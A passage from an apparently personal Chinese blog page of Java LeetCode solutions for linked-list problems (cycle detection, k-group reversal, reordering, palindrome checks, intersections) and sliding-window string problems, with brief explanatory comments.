&#123;</span><br><span class="line">      q = q.next;</span><br><span class="line">      len++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理k大于等于len的情况</span></span><br><span class="line">    k = k % len;</span><br><span class="line">    <span class="keyword">if</span> (k == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将p指向倒数第k+1个位置</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; (len - k)) &#123;</span><br><span class="line">      p = p.next;</span><br><span class="line">      i++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">res</span> <span class="operator">=</span> p.next;</span><br><span class="line">    q.next = head;</span><br><span class="line">    p.next = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="141-环形链表-x2F-x2F-x2F"><a href="#141-环形链表-x2F-x2F-x2F" class="headerlink" title="141. 环形链表&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle/">141. 环形链表</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 快慢指针: 这是因为fast是走两步，slow是走一步，其实相对于slow来说，fast是一个节点一个节点的靠近slow的，所以fast一定可以和slow重合。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (fast.next != <span class="literal">null</span> &amp;&amp; fast.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            <span class="keyword">if</span> (slow == fast) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="142-环形链表-II-x2F"><a href="#142-环形链表-II-x2F" class="headerlink" title="142. 环形链表 II&#x2F;"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/">142. 环形链表 II</a>&#x2F;</h3><h4 id="方法一-快慢指针"><a href="#方法一-快慢指针" class="headerlink" title="方法一:快慢指针"></a>方法一:快慢指针</h4><p><img src="/%E7%AE%97%E6%B3%95.assets/2036dfe7e991f00dfb788a9b84a17bb6fac337e81c09bdf57e683d028a6952bc-%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png" alt="未命名文件.png"></p>
<p>相遇时：</p>
<ul>
<li>slow走过的路程：x + y + n(y+z), n代表slow绕了n圈</li>
<li>fast走过的路程：x + y + m(y+z)，m代表fast饶了m圈</li>
<li>m &gt; n</li>
</ul>
<p>因为fast速度是slow两倍：</p>
<ul>
<li>2(x + y + n(y + z)) &#x3D; x + y + m(y + z)</li>
<li>x + y &#x3D; (m - 2n)(y + z)</li>
<li>x &#x3D; (m - 2n)(y + z) - y</li>
<li>y + z就是1圈，假设 o &#x3D; m-2n，o是一个正整数，那么 x &#x3D; o(y + z) -y</li>
<li>如果o &#x3D; 1，那么 x &#x3D; z，和答主假设的情况一样</li>
<li>如果o &gt; 1，那么 x &#x3D; (o-1)(y+z) + y + z - y, x &#x3D; (o-1)(y+z) + z，即x的长度为o-1圈加上z</li>
</ul>
<p>所以，从第一阶段获得的相遇点，走过x距离机会到达环的起点。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            </span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            <span class="keyword">if</span> (slow == fast) &#123;</span><br><span class="line">                fast = head;</span><br><span class="line">                <span class="keyword">while</span> (slow != fast) &#123;</span><br><span class="line">                    slow = slow.next;</span><br><span class="line">                    fast = fast.next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> slow;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="25-K-个一组翻转链表-x2F"><a href="#25-K-个一组翻转链表-x2F" class="headerlink" title="25. K 个一组翻转链表&#x2F;"></a><a href="https://leetcode-cn.com/problems/reverse-nodes-in-k-group/">25. K 个一组翻转链表</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 头插法反转链表</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseKGroup</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span> || k &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            len++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len / k; i++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; k; j++) &#123;</span><br><span class="line">                tmp = cur.next;</span><br><span class="line">                cur.next = tmp.next;</span><br><span class="line">                tmp.next = pre.next;</span><br><span class="line">                pre.next = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            pre = cur;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="143-重排链表"><a href="#143-重排链表" class="headerlink" title="143. 重排链表"></a><a href="https://leetcode-cn.com/problems/reorder-list">143. 重排链表</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reorderList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            size++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> size / <span class="number">2</span>;</span><br><span class="line">        p = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mid; i++) &#123;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> p.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (cur.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            tmp = cur.next;</span><br><span class="line">            cur.next = tmp.next;</span><br><span class="line">            tmp.next = p.next;</span><br><span class="line">            p.next = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">q</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (p.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            tmp = p.next;</span><br><span class="line">            p.next = tmp.next;</span><br><span class="line">            tmp.next = q.next;</span><br><span class="line">            q.next = tmp;</span><br><span class="line">            q = tmp.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="92-反转链表-II"><a href="#92-反转链表-II" class="headerlink" title="92. 反转链表 II"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list-ii">92. 反转链表 II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseBetween</span><span class="params">(ListNode head, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span> || left &gt; right) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pre</span> <span class="operator">=</span> dummy;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; left - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            pre = pre.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> pre.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; right - left; i++) &#123;</span><br><span class="line">            tmp = cur.next;</span><br><span class="line">            cur.next = tmp.next;</span><br><span class="line">            tmp.next = pre.next;</span><br><span class="line">            pre.next = tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="补充题1-排序奇升偶降链表"><a href="#补充题1-排序奇升偶降链表" class="headerlink" title="补充题1. 排序奇升偶降链表"></a><a href="https://mp.weixin.qq.com/s/377FfqvpY8NwMInhpoDgsw">补充题1. 排序奇升偶降链表</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">sort</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// odd</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">// even</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">q</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummy.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span> &amp;&amp; p.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            tmp = p.next;</span><br><span class="line">            p.next = tmp.next;</span><br><span class="line">            p = p.next;</span><br><span class="line"></span><br><span class="line">            tmp.next = dummy.next;</span><br><span class="line">            dummy.next = tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        q = dummy.next;</span><br><span class="line">        p = head;</span><br><span class="line">        dummy.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span> &amp;&amp; q != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.val &lt;= q.val) &#123;</span><br><span class="line">                tail.next = p;</span><br><span class="line">                tail = tail.next;</span><br><span class="line">                p = p.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tail.next = q;</span><br><span class="line">                tail = tail.next;</span><br><span class="line">                q = q.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            tail.next = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (q != <span class="literal">null</span>) &#123;</span><br><span class="line">            tail.next = q;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-22-链表中倒数第K个节点"><a href="#剑指-Offer-22-链表中倒数第K个节点" class="headerlink" title="剑指 Offer 22. 链表中倒数第K个节点"></a><a href="https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof">剑指 Offer 22. 链表中倒数第K个节点</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">getKthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || k &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (k &gt; count) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line"></span><br><span class="line">        p = dummy;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> count - k + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            p = p.next;</span><br><span class="line">            num--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="234-回文链表"><a href="#234-回文链表" class="headerlink" title="234. 回文链表"></a><a href="https://leetcode-cn.com/problems/palindrome-linked-list">234. 回文链表</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先反转再遍历比较</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPalindrome</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span> (fast.next != <span class="literal">null</span> &amp;&amp; fast.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> slow.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (p.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            temp = p.next;</span><br><span class="line">            p.next = temp.next;</span><br><span class="line">            temp.next = slow.next;</span><br><span class="line">            slow.next = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        p = slow.next;</span><br><span class="line">        slow.next = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (head != <span class="literal">null</span> &amp;&amp; p != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (head.val != p.val) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            head = head.next;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="160-相交链表"><a href="#160-相交链表" class="headerlink" title="160. 相交链表"></a><a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists/">160. 相交链表</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (headA == <span class="literal">null</span> || headB == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sizeA</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sizeB</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> headA, q;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            sizeA++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        p = headB;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            sizeB++;</span><br><span class="line">            p = p.next;</span><br><span class="line">        &#125;</span><br><span class="line">        p = headA;</span><br><span class="line">        q = headB;</span><br><span class="line">        <span class="keyword">if</span> (sizeA &gt; sizeB) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> sizeA - sizeB;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">                p = p.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> sizeB - sizeA;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">                q = q.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span> &amp;&amp; q != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p == q) &#123;</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p.next;</span><br><span class="line">            q = q.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h2><h3 id="3-无重复字符的最长子串-x2F-x2F-x2F-x2F"><a href="#3-无重复字符的最长子串-x2F-x2F-x2F-x2F" class="headerlink" title="3. 无重复字符的最长子串&#x2F;&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a>&#x2F;&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 滑动窗口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        HashMap&lt;Character, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; sc.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(sc[i])) &#123;</span><br><span class="line">                <span class="comment">// abba这个通过不了</span></span><br><span class="line">                <span class="comment">// left = map.get(charArray[i]); </span></span><br><span class="line">                left = Math.max(left, map.get(sc[i]) + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(sc[i], i);</span><br><span class="line">            max = Math.max(max, i - left + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="76-最小覆盖子串"><a href="#76-最小覆盖子串" class="headerlink" title="76. 最小覆盖子串"></a><a href="https://leetcode-cn.com/problems/minimum-window-substring/">76. 最小覆盖子串</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 滑动窗口</span></span><br><span class="line"><span class="comment">//一个用于「延伸」现有窗口的r 指针，和一个用于「收缩」窗口的l 指针。在任意时刻，只有一个指针运动，而另一</span></span><br><span class="line"><span class="comment">//个保持静止。我们在 s 上滑动窗口，通过移动 r 指针不断扩张窗口。当窗口包含 t 全部所需的字符后，如果能收</span></span><br><span class="line"><span class="comment">//缩，我们就收缩窗口直到得到最小窗口。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">minWindow</span><span class="params">(String s, String t)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span> || s == <span class="string">&quot;&quot;</span> || t == <span class="literal">null</span> || t == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] tc = t.toCharArray();</span><br><span class="line">        <span class="type">int</span>[] need = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">128</span>];</span><br><span class="line">        <span class="type">int</span>[] have = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">128</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tc.length; i++) &#123;</span><br><span class="line">            need[tc[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>, r = <span class="number">0</span>, count = <span class="number">0</span>, min = sc.length + <span class="number">1</span>, start = l;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (r &lt; sc.length) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> sc[r];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (need[c] == <span class="number">0</span>) &#123;</span><br><span class="line">                r++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (have[c] &lt; need[c]) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            have[c]++;</span><br><span class="line">            r++;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (count == tc.length) &#123;</span><br><span class="line">                c = sc[l];</span><br><span class="line">                <span class="keyword">if</span> (need[c] == <span class="number">0</span>) &#123;</span><br><span class="line">                    l++;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (r - l &lt; min) &#123;</span><br><span class="line">                    min = r - l;</span><br><span class="line">                    start = l;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (have[c] == need[c]) &#123;</span><br><span class="line">                    count--;</span><br><span class="line">                &#125;</span><br><span class="line">                have[c]--;</span><br><span class="line">                l++;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (min == s.length() + <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substring(start, start + min);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

